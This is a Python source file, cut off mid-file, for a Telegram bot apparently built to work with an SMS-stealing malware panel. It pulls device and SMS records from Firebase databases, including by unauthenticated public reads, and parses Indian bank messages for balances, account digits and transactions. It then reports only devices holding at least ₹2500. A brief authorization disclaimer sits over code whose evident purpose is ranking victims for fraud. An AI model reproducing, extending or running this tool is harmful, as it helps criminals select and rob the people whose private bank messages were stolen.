"""
ERA X Scanner Bot - with Balance Filter (≥ 2500)

Install:
    pip install python-telegram-bot[job-queue]==21.10 firebase-admin==6.6.0 python-dotenv==1.0.1

Required environment variables:
    TELEGRAM_BOT_TOKEN=<bot-token>
    TELEGRAM_ADMIN_IDS=<numeric-telegram-user-id>
    FIREBASE_DATABASE_URL=https://your-project-default-rtdb.firebaseio.com
    GOOGLE_APPLICATION_CREDENTIALS=/absolute/path/service-account.json

Optional:
    FIREBASE_ROOT_PATH=/
    DB_PATH=./era_x_scanner.sqlite3
    MAX_LIVE_DEVICES=20
    MAX_REPORT_ROWS=500
    BALANCE_THRESHOLD=2500

Safety: use only with Firebase projects and devices for which you have authorization and consent.
This build parses SMS text to extract available balance (same logic as ERA X Panel)
and only reports devices whose parsed Available Balance is >= BALANCE_THRESHOLD (default 2500).
"""
from __future__ import annotations

import asyncio
import csv
import hashlib
import html
import io
import json
import logging
import os
import re
import sqlite3
import sys
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, asdict, field
from datetime import datetime, timezone
from functools import wraps
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

from dotenv import load_dotenv
from firebase_admin import credentials, db
import firebase_admin
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.error import NetworkError, TimedOut
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters

load_dotenv(Path(__file__).with_name(".env"), override=False)
logging.basicConfig(level=os.getenv("LOG_LEVEL", "INFO"))
log = logging.getLogger("era-x-scanner")

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
ADMIN_IDS = {
    int(x.strip())
    for x in os.getenv("TELEGRAM_ADMIN_IDS", "").split(",")
    if x.strip().lstrip("-").isdigit()
}
ROOT_PATH = os.getenv("FIREBASE_ROOT_PATH", "/")


def env_int(name: str, default: int, minimum: int = 1) -> int:
    value = os.getenv(name, str(default)).strip()
    try:
        parsed = int(value)
    except ValueError as exc:
        raise SystemExit(f"{name} must be an integer, got {value!r}") from exc
    if parsed < minimum:
        raise SystemExit(f"{name} must be >= {minimum}, got {parsed}")
    return parsed


MAX_LIVE = env_int("MAX_LIVE_DEVICES", 20)
MAX_ROWS = env_int("MAX_REPORT_ROWS", 500)
BALANCE_THRESHOLD = float(os.getenv("BALANCE_THRESHOLD", "2500"))
DB_PATH = os.getenv("DB_PATH", "./era_x_scanner.sqlite3")
scan_lock = asyncio.Lock()
firebase_ready = False

ALIASES = {
    "device": ("deviceId", "device_id", "androidId", "installationId"),
    "client": ("clientId", "client_id", "userId", "user_id", "uid"),
    "phone": ("phone", "mobile", "mobileNumber", "phoneNumber", "mobNo"),
    "network": ("network", "carrier", "operator", "simOperator", "service_provider", "serviceProvider"),
    "online": ("online", "isOnline", "connected", "status"),
    "battery": ("battery", "batteryPercentage", "batteryLevel"),
    "last_seen": ("lastSeen", "last_seen", "updatedAt", "lastActivity", "timestamp", "joined"),
    "sender": ("senderId", "senderID", "sender_id", "sender", "originator"),
}
SMS_KEYS = {
    "sms", "smses", "smsHistory", "sms_history", "messages", "messageHistory",
    "deliveryHistory", "delivery_history", "deliveries", "lastSmsEvent",
    "last_sms_event", "lastSmsEventDate", "last_sms_event_date", "smsStatus", "sms_status"
}
IDENTITY_KEYS = {x for values in ALIASES.values() for x in values} - {"status", "connected"}

# ---------------------------------------------------------------------------
# Balance parser (ported from ERA X Panel e1 / Gu / Xu logic)
# ---------------------------------------------------------------------------

BANK_SENDER_MAP = [
    (re.compile(r"HDFCBK|HDFCBANK|HDFC", re.I), "HDFC Bank"),
    (re.compile(r"SBIIN|SBIINB|SBI", re.I), "SBI"),
    (re.compile(r"ICICIB|ICICI", re.I), "ICICI Bank"),
    (re.compile(r"AXISBK|AXISBANK|AXIS", re.I), "Axis Bank"),
    (re.compile(r"KOTAKB|KOTAK", re.I), "Kotak Bank"),
    (re.compile(r"PNBSMS|PNB", re.I), "PNB"),
    (re.compile(r"BOIIND|BOI", re.I), "Bank of India"),
    (re.compile(r"CANBNK|CANARA", re.I), "Canara Bank"),
    (re.compile(r"UNIONB|UBISMS", re.I), "Union Bank"),
    (re.compile(r"YESBNK|YESBANK", re.I), "Yes Bank"),
    (re.compile(r"IDBIBK|IDBI", re.I), "IDBI Bank"),
    (re.compile(r"INDUSB|INDUSIND", re.I), "IndusInd Bank"),
    (re.compile(r"FEDERAL|FEDBNK", re.I), "Federal Bank"),
]

# Regexes for Available Balance (same order/priority as panel Vp)
BALANCE_RES = [
    # Compact forms common in PNB/SBI etc: "AvlBal INR 1265.51"
    re.compile(r"AvlBal\s*(?:INR|Rs\.?|₹)?\s*([0-9,]+\.?[0-9]*)", re.I),
    re.compile(r"AvalBal\s*(?:INR|Rs\.?|₹)?\s*([0-9,]+\.?[0-9]*)", re.I),
    re.compile(r"AvblBal\s*(?:INR|Rs\.?|₹)?\s*([0-9,]+\.?[0-9]*)", re.I),
    re.compile(r"Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)", re.I),
    re.compile(r"Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)", re.I),
    re.compile(r"Avbl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)", re.I),
    re.compile(r"Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)", re.I),
    re.compile(r"Avl(?:able)?\.?\s*Bal(?:ance)?\.?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)", re.I),
    re.compile(r"(?:Avl|Avbl|Aval)\.?\s*(?:Bal(?:ance)?)\.?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)", re.I),
    re.compile(r"Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)", re.I),
    re.compile(r"(?:Avl|Avail|Aval).*?(?:INR|Rs\.?|₹)\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)", re.I),
    re.compile(r"Bal[\.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)", re.I),
    # "Bal Rs 11309.06" style
    re.compile(r"\bBal\s+Rs\.?\s*([0-9,]+\.?[0-9]*)", re.I),
]

# Transaction amount regexes (Qp)
TXN_RES = [
    re.compile(r"(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)", re.I),
    re.compile(r"(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)", re.I),
    re.compile(r"^(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)", re.I),
    re.compile(r"(?:INR|Rs\.?|₹)\s*([0-9]{2,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)", re.I),
]

# Account last-4 regexes (Kp)
ACCT_RES = [
    re.compile(r"(?:A/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})", re.I),
    re.compile(r"[xX*]{4,}([0-9]{4})"),
    re.compile(r"ending\s+(?:with\s+)?([0-9]{4})", re.I),
]

KEYWORD_RE = re.compile(
    r"AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A/C|ACCOUNT|INR|RUPEE",
    re.I,
)


def detect_bank(sender: str) -> str:
    for pattern, name in BANK_SENDER_MAP:
        if pattern.search(sender or ""):
            return name
    return "Bank"


def parse_sms_balance(text: str, sender: str = "") -> dict[str, Any] | None:
    """Port of panel e1() – returns balance info or None."""
    if not text or len(text.strip()) < 8:
        return None
    upper = text.upper()
    has_keyword = bool(KEYWORD_RE.search(upper))
    # also accept known bank senders even without keyword
    is_bank_sender = any(p.search(sender or "") for p, _ in BANK_SENDER_MAP)
    if not has_keyword and not is_bank_sender:
        return None

    available = None
    for rx in BALANCE_RES:
        m = rx.search(text)
        if m and m.group(1):
            raw = m.group(1).replace(",", "")
            try:
                if float(raw) >= 0:
                    available = raw
                    break
            except ValueError:
                continue
    if not available:
        return None

    txn_amount = None
    for rx in TXN_RES:
        m = rx.search(text)
        if m and m.group(1):
            raw = m.group(1).replace(",", "")
            if raw != available:
                txn_amount = raw
                break

    txn_type = None
    if re.search(r"credit(?:ed)?", text, re.I):
        txn_type = "credit"
    elif re.search(r"debit(?:ed)?|withdraw|paid|purchase|spent", text, re.I):
        txn_type = "debit"

    account_last4 = None
    for rx in ACCT_RES:
        m = rx.search(text)
        if m and m.group(1):
            digits = re.sub(r"[^0-9]", "", m.group(1))
            if len(digits) >= 4:
                account_last4 = digits[-4:]
                break

    return {
        "bankName": detect_bank(sender),
        "senderName": sender or "Unknown",
        "availableBalance": available,
        "transactionAmount": txn_amount,
        "transactionType": txn_type,
        "accountLast4": account_last4,
        "rawSms": text[:200],
        "detectedAt": datetime.now(timezone.utc).isoformat(),
    }


def collect_sms_from_messages_node(messages_node: Any) -> list[dict[str, str]]:
    """Port of panel Gu() – take last 150 SMS entries."""
    out: list[dict[str, str]] = []
    if not isinstance(messages_node, dict):
        return out
    entries = list(messages_node.items())
    if len(entries) > 150:
        entries = entries[-150:]
    for _, item in entries:
        if not isinstance(item, dict):
            continue
        text = str(item.get("message") or item.get("body") or item.get("text") or "").strip()
        if not text:
            continue
        sender = str(item.get("sender") or item.get("from") or "Unknown")
        time_str = str(item.get("dateTime") or item.get("date") or "")
        out.append({"text": text, "sender": sender, "time": time_str})
    out.reverse()
    return out


def analyze_sms_list(sms_list: list[dict[str, str]]) -> dict[str, Any]:
    """Port of panel Xu() – returns bankBalances etc."""
    bank_balances: list[dict[str, Any]] = []
    for sms in sms_list:
        parsed = parse_sms_balance(sms["text"], sms["sender"])
        if parsed:
            if sms.get("time"):
                parsed["detectedAt"] = sms["time"]
            bank_balances.append(parsed)
    return {"bankBalances": bank_balances}


def best_balance(analysis: dict[str, Any]) -> dict[str, Any] | None:
    """Take bankBalances[0] like the panel does."""
    bals = analysis.get("bankBalances") or []
    return bals[0] if bals else None


# ---------------------------------------------------------------------------
# Original Record + helpers
# ---------------------------------------------------------------------------

@dataclass
class Record:
    identity: str
    source_path: str
    device_id: str = ""
    client_id: str = ""
    phone: str = ""
    network: str = ""
    online: str = "unknown"
    battery: str = ""
    sender_ids: tuple[str, ...] = ()
    last_seen: str = ""
    sms_present: bool = False
    duplicate_count: int = 1
    raw_hash: str = ""
    # New balance fields
    available_balance: float = 0.0
    bank_name: str = ""
    account_last4: str = ""
    transaction_amount: str = ""
    transaction_type: str = ""
    raw_sms_snippet: str = ""
    balance_detected_at: str = ""


def txt(v: Any) -> str:
    return "" if v is None or isinstance(v, (dict, list, tuple)) else str(v).strip()


def find(d: dict[str, Any], names: tuple[str, ...]) -> Any:
    lower = {str(k).lower(): v for k, v in d.items()}
    for name in names:
        if name in d:
            return d[name]
        if name.lower() in lower:
            return lower[name.lower()]
    return ""


def values(v: Any) -> list[str]:
    if isinstance(v, dict):
        out: list[str] = []
        for x in v.values():
            out.extend(values(x))
        return out
    if isinstance(v, list):
        out = []
        for x in v:
            out.extend(values(x))
        return out
    return [txt(v)] if txt(v) else []


def sms_present(d: dict[str, Any]) -> bool:
    lower = {str(k).lower(): v for k, v in d.items()}
    for key in SMS_KEYS:
        v = lower.get(key.lower())
        if key.lower() == "messages" and isinstance(v, (dict, list)):
            continue
        if v is not None and v is not False and v != "" and (not isinstance(v, (dict, list)) or bool(v)):
            return True
    return False


def candidate(d: dict[str, Any]) -> bool:
    keys = {str(k).lower() for k in d}
    if keys & {x.lower() for x in IDENTITY_KEYS}:
        return True
    for key, value in d.items():
        if str(key).lower() in {x.lower() for x in SMS_KEYS}:
            if str(key).lower() == "messages" and isinstance(value, (dict, list)):
                continue
            return True
    return False


def online_value_from_dict(d: dict[str, Any]) -> str:
    """
    Match ERA X Panel exactly: status is !!S.status
    - true / "true" / 1 / "1" / "online" / "connected" / "active" → online
    - anything else (false, null, missing, "", 0) → offline
    Prefer explicit 'status' field first (same as panel), then other aliases.
    """
    # Panel uses S.status first
    for key in ("status", "online", "isOnline", "connected"):
        if key in d:
            v = d[key]
            break
        lower = {str(k).lower(): k for k in d}
        if key.lower() in lower:
            v = d[lower[key.lower()]]
            break
    else:
        return "offline"  # missing → offline (panel behavior)

    if v is True:
        return "online"
    if v is False or v is None:
        return "offline"
    x = str(v).strip().lower()
    if x in {"true", "1", "online", "connected", "active", "yes"}:
        return "online"
    # everything else (including empty string, "false", "0", unknown values) → offline
    return "offline"


def make_record(d: dict[str, Any], path: str, path_client: str = "", path_device: str = "") -> Record:
    device = txt(find(d, ALIASES["device"])) or path_device
    client = txt(find(d, ALIASES["client"])) or path_client
    phone = txt(find(d, ALIASES["phone"]))
    identity = f"{client}:{device}" if client and device and path_client else (device or client or phone or "path:" + path)
    senders = tuple(sorted(set(values(find(d, ALIASES["sender"])))))
    raw = json.dumps(d, sort_keys=True, default=str, separators=(",", ":"))
    return Record(
        identity, path, device, client, phone,
        txt(find(d, ALIASES["network"])),
        online_value_from_dict(d),
        txt(find(d, ALIASES["battery"])),
        senders,
        txt(find(d, ALIASES["last_seen"])),
        sms_present(d),
        1,
        hashlib.sha256(raw.encode()).hexdigest(),
    )


def scan_tree(snapshot: Any, root: str = "/") -> list[Record]:
    found: dict[str, Record] = {}

    def walk(node: Any, path: str) -> None:
        if isinstance(node, dict):
            if candidate(node):
                parts = [part for part in path.split("/") if part]
                path_client = parts[-2] if len(parts) >= 3 and parts[-3].lower() == "messages" else ""
                path_device = parts[-1] if path_client else ""
                r = make_record(node, path, path_client, path_device)
                old = found.get(r.identity)
                if old is None:
                    found[r.identity] = r
                else:
                    old.duplicate_count += 1
                    for field_name in ("device_id", "client_id", "phone", "network", "battery", "last_seen"):
                        if not getattr(old, field_name) and getattr(r, field_name):
                            setattr(old, field_name, getattr(r, field_name))
                    old.sender_ids = tuple(sorted(set(old.sender_ids) | set(r.sender_ids)))
                    old.sms_present = old.sms_present or r.sms_present
            for k, v in node.items():
                walk(v, (path.rstrip("/") + "/" + str(k)) if path != "/" else "/" + str(k))
        elif isinstance(node, list):
            for i, v in enumerate(node):
                walk(v, path.rstrip("/") + "/" + str(i))

    walk(snapshot, root or "/")
    return sorted(found.values(), key=lambda r: (not r.sms_present, r.identity.lower()))


def apply_balance_to_record(rec: Record, message_node: Any) -> None:
    """Parse messages node (Panel Gu+Xu+e1) and fill balance fields on the record."""
    if message_node is None:
        return
    sms_list = collect_sms_from_messages_node(message_node)
    analysis = analyze_sms_list(sms_list)
    top = best_balance(analysis)
    if not top:
        return
    try:
        bal = float(str(top["availableBalance"]).replace(",", ""))
    except (ValueError, TypeError):
        bal = 0.0
    rec.available_balance = bal
    rec.bank_name = top.get("bankName") or ""
    rec.account_last4 = top.get("accountLast4") or ""
    rec.transaction_amount = top.get("transactionAmount") or ""
    rec.transaction_type = top.get("transactionType") or ""
    rec.raw_sms_snippet = (top.get("rawSms") or "")[:120]
    rec.balance_detected_at = top.get("detectedAt") or ""
    # mark SMS present if we successfully parsed content
    if sms_list:
        rec.sms_present = True


def scan_device_snapshot(snapshot: Any, root: str = "/", messages_override: dict[str, Any] | None = None) -> list[Record]:
    """Join the app's client/device nodes with sender metadata from messages + balance parse.

    messages_override: optional pre-fetched {client_id: messages_node} so we don't need
    the entire messages tree inside the root snapshot (important for large DBs).
    """
    clients = snapshot.get("clients") if isinstance(snapshot, dict) else None
    devices = snapshot.get("devices") if isinstance(snapshot, dict) else None
    messages = messages_override if messages_override is not None else (
        snapshot.get("messages") if isinstance(snapshot, dict) else None
    )
    if not isinstance(clients, dict) and not isinstance(devices, dict):
        return scan_tree(snapshot, root)

    clients = clients if isinstance(clients, dict) else {}
    devices = devices if isinstance(devices, dict) else {}
    messages = messages if isinstance(messages, dict) else {}
    client_ids = sorted(set(clients) | set(devices))
    records: list[Record] = []

    for client_id in client_ids:
        merged: dict[str, Any] = {}
        # clients first, then devices (devices overwrite — status usually lives here)
        if isinstance(clients.get(client_id), dict):
            merged.update(clients[client_id])
        device_node = devices.get(client_id)
        if isinstance(device_node, dict):
            merged.update(device_node)
            # Prefer explicit status from device node (panel reads S.status)
            if "status" in device_node:
                merged["status"] = device_node["status"]
            if "ping" in device_node and not merged.get("lastSeen"):
                merged["lastSeen"] = device_node["ping"]
        merged.setdefault("clientId", client_id)
        merged.setdefault("deviceId", client_id)

        sender_ids: set[str] = set()
        message_node = messages.get(client_id)

        def collect_senders(node: Any) -> None:
            if isinstance(node, dict):
                sender_ids.update(values(find(node, ALIASES["sender"])))
                for child in node.values():
                    collect_senders(child)
            elif isinstance(node, list):
                for child in node:
                    collect_senders(child)

        collect_senders(message_node)
        if sender_ids:
            merged["senderId"] = sorted(sender_ids)

        rec = make_record(merged, f"/clients/{client_id}")
        apply_balance_to_record(rec, message_node)
        records.append(rec)

    return sorted(records, key=lambda r: r.identity.lower())


class Store:
    def __init__(self, path: str):
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        self.db = sqlite3.connect(path, check_same_thread=False)
        self.db.row_factory = sqlite3.Row
        self.db.executescript("""
        CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT NOT NULL);
        CREATE TABLE IF NOT EXISTS scans (id INTEGER PRIMARY KEY AUTOINCREMENT, started TEXT, finished TEXT, path TEXT, status TEXT, error TEXT, summary TEXT, records TEXT);
        """)
        self.db.commit()

    def get(self, key: str, default: str = "") -> str:
        r = self.db.execute("SELECT value FROM config WHERE key=?", (key,)).fetchone()
        return r[0] if r else default

    def set(self, key: str, value: str) -> None:
        self.db.execute("INSERT OR REPLACE INTO config(key,value) VALUES(?,?)", (key, value))
        self.db.commit()

    def clients(self) -> set[str]:
        return {x for x in self.get("allowed_clients").split(",") if x}

    def senders(self) -> set[str]:
        return {x for x in self.get("sender_ids").split(",") if x}

    def add(self, key: str, vals: list[str]) -> int:
        old = {x for x in self.get(key).split(",") if x}
        before = len(old)
        old.update(x for x in vals if x)
        self.set(key, ",".join(sorted(old)))
        return len(old) - before

    def remove(self, key: str, val: str) -> bool:
        old = {x for x in self.get(key).split(",") if x}
        existed = val in old
        old.discard(val)
        self.set(key, ",".join(sorted(old)))
        return existed

    def start(self, path: str) -> int:
        cur = self.db.execute("INSERT INTO scans(started,path,status) VALUES(?,?,?)", (now(), path, "running"))
        self.db.commit()
        return cur.lastrowid

    def finish(self, sid: int, records: list[Record], status: str, error: str = "") -> None:
        s = stats(records)
        self.db.execute(
            "UPDATE scans SET finished=?,status=?,error=?,summary=?,records=? WHERE id=?",
            (now(), status, error, json.dumps(s), json.dumps([asdict(x) for x in records]), sid),
        )
        self.db.commit()

    def latest(self):
        return self.db.execute("SELECT * FROM scans ORDER BY id DESC LIMIT 1").fetchone()


store = Store(DB_PATH)


def now() -> str:
    return datetime.now(timezone.utc).isoformat()


def stats(rs: list[Record]) -> dict[str, int]:
    return {
        "total": len(rs),
        "online": sum(r.online == "online" for r in rs),
        "offline": sum(r.online == "offline" for r in rs),
        "sms_present": sum(r.sms_present for r in rs),
        "sms_missing": sum(not r.sms_present for r in rs),
        "duplicates": sum(max(0, r.duplicate_count - 1) for r in rs),
        "with_balance_ge_threshold": sum(1 for r in rs if r.available_balance >= BALANCE_THRESHOLD),
    }


def esc(v: Any) -> str:
    return html.escape(str(v or ""))


def admin_only(fn):
    @wraps(fn)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.effective_user or update.effective_user.id not in ADMIN_IDS:
            await update.effective_message.reply_text("Access denied: admin only.")
            return
        return await fn(update, context)
    return wrapper


def init_firebase() -> None:
    global firebase_ready
    if firebase_ready:
        return
    if firebase_admin._apps:
        firebase_ready = True
        return
    raw = os.getenv("FIREBASE_SERVICE_ACCOUNT_JSON", "").strip()
    if raw:
        cred = credentials.Certificate(json.loads(raw))
    else:
        path = os.getenv("GOOGLE_APPLICATION_CREDENTIALS", "").strip()
        if not path:
            raise RuntimeError("No Firebase service account configured")
        cred = credentials.Certificate(path)
    firebase_admin.initialize_app(cred, {"databaseURL": os.environ["FIREBASE_DATABASE_URL"]})
    firebase_ready = True


def public_firebase_url(path: str) -> str:
    base = (store.get("firebase_url") or os.getenv("FIREBASE_DATABASE_URL", "")).strip().rstrip("/")
    if not base:
        raise RuntimeError("Configure a Firebase URL with /firebase <URL> first")
    parsed = urlparse(base)
    host = (parsed.hostname or "").lower()
    if parsed.scheme != "https" or not (host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app")):
        raise RuntimeError("Only an https Firebase Realtime Database URL is allowed")
    suffix = "" if path in {"", "/"} else "/" + path.strip("/")
    return f"{base}/.json" if not suffix else f"{base}{suffix}.json"


async def public_firebase_read(path: str, timeout: int = 45) -> Any:
    url = public_firebase_url(path)

    def fetch() -> Any:
        try:
            with urllib.request.urlopen(url, timeout=timeout) as response:
                return json.loads(response.read().decode("utf-8"))
        except urllib.error.HTTPError as exc:
            if exc.code in {401, 403}:
                raise RuntimeError("Firebase public read is denied by the database rules") from exc
            if exc.code == 404:
                return None
            raise RuntimeError(f"Firebase returned HTTP {exc.code}") from exc
        except json.JSONDecodeError as exc:
            raise RuntimeError("Firebase returned non-JSON data") from exc
        except Exception as exc:
            raise RuntimeError(f"Firebase read failed: {exc}") from exc

    return await asyncio.to_thread(fetch)


async def firebase_read(path: str) -> Any:
    has_service_account = bool(
        os.getenv("FIREBASE_SERVICE_ACCOUNT_JSON", "").strip()
        or os.getenv("GOOGLE_APPLICATION_CREDENTIALS", "").strip()
    )
    if not has_service_account:
        return await public_firebase_read(path)
    init_firebase()
    for attempt in range(3):
        try:
            return await asyncio.to_thread(lambda: db.reference(path or "/").get())
        except Exception:
            if attempt == 2:
                raise
            await asyncio.sleep(2 ** attempt)


def selected(records: list[Record]) -> list[Record]:
    allowed = store.clients()
    rs = [r for r in records if (not allowed or r.client_id in allowed or r.identity in allowed)]
    return rs


def format_report(records: list[Record], mode: str = "all") -> str:
    rs = selected(records)
    allowed_senders = store.senders()

    # Always apply the ≥ BALANCE_THRESHOLD filter first
    rs = [r for r in rs if r.available_balance >= BALANCE_THRESHOLD]

    if mode == "matched":
        shown = [r for r in rs if allowed_senders and set(r.sender_ids) & allowed_senders]
    elif mode == "no_match":
        shown = [r for r in rs if not allowed_senders or not (set(r.sender_ids) & allowed_senders)]
    elif mode == "online_no_match":
        shown = [r for r in rs if r.online == "online" and (not allowed_senders or not (set(r.sender_ids) & allowed_senders))]
    elif mode == "online":
        shown = [r for r in rs if r.online == "online"]
    elif mode == "offline":
        shown = [r for r in rs if r.online == "offline"]
    elif mode == "missing":
        shown = [r for r in rs if not r.sms_present]
    else:
        shown = rs

    s = stats(selected(records))  # original full stats for reference
    source_url = (store.get("firebase_url") or os.getenv("FIREBASE_DATABASE_URL", "")).strip().rstrip("/") or "(not configured)"
    out = [
        f"<b>✦ DEVICE REPORT (≥ ₹{int(BALANCE_THRESHOLD)}) ✦</b>",
        f"Firebase URL: {esc(source_url)}",
        f"Checked: <b>{s['total']}</b> | Online: {s['online']} | Offline: {s['offline']}",
        f"With Balance ≥ ₹{int(BALANCE_THRESHOLD)}: <b>{s['with_balance_ge_threshold']}</b>",
        f"Configured sender IDs: {esc(', '.join(sorted(allowed_senders)) or '(none)')}",
        f"Mode: {esc(mode)}",
        "",
    ]
    if not shown:
        out.append(f"No devices found with Available Balance ≥ ₹{int(BALANCE_THRESHOLD)}.")
    for i, r in enumerate(shown[:MAX_ROWS], 1):
        matched = bool(allowed_senders and set(r.sender_ids) & allowed_senders)
        sender_text = ", ".join(r.sender_ids[:8]) or "(none)"
        bal_line = f"₹{r.available_balance:,.2f}" if r.available_balance else "—"
        bank_line = r.bank_name or "—"
        acct = f"••{r.account_last4}" if r.account_last4 else "—"
        txn = ""
        if r.transaction_amount:
            sign = "+" if r.transaction_type == "credit" else "-"
            txn = f"{sign}₹{r.transaction_amount} ({r.transaction_type or '?'})"

        out.append(
            f"<b>{i}. {esc(r.device_id or r.client_id or r.identity)}</b> — Sender match: {'YES' if matched else 'NO'}\n"
            f"Bank: {esc(bank_line)} | Balance: <b>{esc(bal_line)}</b> | A/C: {esc(acct)}\n"
            f"Txn: {esc(txn or '—')} | Network: {esc(r.network)} | Online: {esc(r.online)}\n"
            f"Battery: {esc(r.battery)} | Last seen: {esc(r.last_seen)}\n"
            f"Source: <code>{esc(r.source_path)}</code>"
        )
    return "\n\n".join(out)


def report_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("All (≥2500)", callback_data="report:all"), InlineKeyboardButton("Matched", callback_data="report:matched")],
        [InlineKeyboardButton("No match", callback_data="report:no_match"), InlineKeyboardButton("Online + no match", callback_data="report:online_no_match")],
        [InlineKeyboardButton("Offline", callback_data="report:offline"), InlineKeyboardButton("Refresh", callback_data="report:refresh")],
    ])


async def reply_report(message: Any, report_text: str, with_buttons: bool = True) -> None:
    blocks = report_text.split("\n\n")
    chunk = ""
    for block in blocks:
        candidate_text = block if not chunk else f"{chunk}\n\n{block}"
        if len(candidate_text) <= 3900:
            chunk = candidate_text
            continue
        if chunk:
            await message.reply_text(chunk, parse_mode=ParseMode.HTML)
        if len(block) > 3900:
            await message.reply_text(block[:3900], parse_mode=None)
            chunk = ""
        else:
            chunk = block
    if chunk:
        await message.reply_text(chunk, parse_mode=ParseMode.HTML, reply_markup=report_keyboard() if with_buttons else None)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(
        f"ERA X Scanner Bot ready (Balance filter ≥ ₹{int(BALANCE_THRESHOLD)}).\nUse /help."
    )


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(
        "/scan [path] fresh scan\n"
        "/report [all|missing]\n"
        "/export [all|missing]\n"
        "/firebase <URL> show Firebase URL details\n"
        "/allowclient ID1 ID2\n"
        "/removeclient ID\n"
        "/listclients\n"
        "/addsender ID1 ID2\n"
        "/removesender ID\n"
        "/listsenders\n"
        "/status\n\n"
        f"Note: Only devices with parsed Available Balance ≥ ₹{int(BALANCE_THRESHOLD)} are shown."
    )


def firebase_url_details(value: str) -> str:
    parsed = urlparse(value.strip())
    host = (parsed.hostname or "").lower()
    allowed = host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app")
    if parsed.scheme != "https" or not allowed:
        return "Invalid Firebase Realtime Database URL. Use an https://...firebaseio.com or https://...firebasedatabase.app URL."
    configured = (store.get("firebase_url") or os.getenv("FIREBASE_DATABASE_URL", "")).strip()
    match = configured.rstrip("/") == value.strip().rstrip("/") if configured else False
    return (
        "Firebase URL received.\n"
        f"Host: {esc(host)}\n"
        f"Path: {esc(parsed.path or '/')}\n"
        f"Configured in this process: {'yes' if match else 'no'}\n\n"
        "This URL is used only for a public HTTPS .json read. The database rules must allow read access; private keys are never accepted in Telegram."
    )


@admin_only
async def firebase_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    value = context.args[0].strip() if context.args else os.getenv("FIREBASE_DATABASE_URL", "").strip()
    if not value:
        await update.effective_message.reply_text("Usage: /firebase https://your-project-default-rtdb.firebaseio.com")
        return
    parsed = urlparse(value)
    host = (parsed.hostname or "").lower()
    if parsed.scheme != "https" or not (host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app")):
        await update.effective_message.reply_text(firebase_url_details(value))
        return
    store.set("firebase_url", value.rstrip("/"))
    await update.effective_message.reply_text("Firebase URL saved. Reading the root data now …")
    await run_scan(update.effective_message, ROOT_PATH, "all", True)


@admin_only
async def firebase_url_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    value = (update.effective_message.text or "").strip()
    if value.startswith("http://") or value.startswith("https://"):
        parsed = urlparse(value)
        host = (parsed.hostname or "").lower()
        if host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app"):
            store.set("firebase_url", value.rstrip("/"))
            await update.effective_message.reply_text("Firebase URL saved. Reading the root data now …")
            await run_scan(update.effective_message, ROOT_PATH, "all", True)


@admin_only
async def allowclient(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.effective_message.reply_text("Usage: /allowclient CLIENT_ID [CLIENT_ID ...]")
        return
    await update.effective_message.reply_text(f"Added {store.add('allowed_clients', context.args)} client ID(s).")


@admin_only
async def removeclient(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.effective_message.reply_text("Usage: /removeclient CLIENT_ID")
        return
    await update.effective_message.reply_text("Removed." if store.remove("allowed_clients", context.args[0]) else "Not found.")


@admin_only
async def listclients(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(
        "Allowed clients:\n" + ("\n".join(sorted(store.clients())) or "(all clients; use /allowclient to restrict)")
    )


@admin_only
async def addsender(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(
        f"Added {store.add('sender_ids', context.args)} sender ID(s)." if context.args else "Usage: /addsender ID1 ID2"
    )


@admin_only
async def removesender(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(
        "Removed." if context.args and store.remove("sender_ids", context.args[0]) else "Not found."
    )


@admin_only
async def listsenders(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(
        "Sender IDs:\n" + ("\n".join(sorted(store.senders())) or "(none)")
    )


@admin_only
